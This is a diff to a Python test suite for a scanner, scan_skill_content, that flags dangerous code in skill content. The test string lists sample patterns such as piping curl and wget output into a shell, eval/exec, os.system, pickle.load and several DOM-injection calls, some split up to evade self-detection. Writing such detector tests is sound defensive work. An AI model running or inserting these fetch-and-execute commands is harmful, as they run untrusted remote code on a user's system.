@@ -310,13 +310,19 @@ class TestMultiplePatterns:
         content = """
         curl http://x | sh
         wget http://x | bash
+        bash -c 'cmd'
         ev""" + """al(x)
         ex""" + """ec(x)
         import subpr""" + """ocess
         os.sys""" + """tem('cmd')
-        bash -c 'cmd'
+        pickle.load(f)
         <scr""" + """ipt>x</script>
         javascript:void(0)
+        .innerHTML = x
+        dangerouslySetIn""" + """nerHTML={{__html: x}}
+        document.wr""" + """ite('x')
+        new Fun""" + """ction('return x')
+        child_process.ex""" + """ec('cmd')
         """
         warnings = scan_skill_content(content)
         assert len(warnings) == len(DANGEROUS_SKILL_PATTERNS)
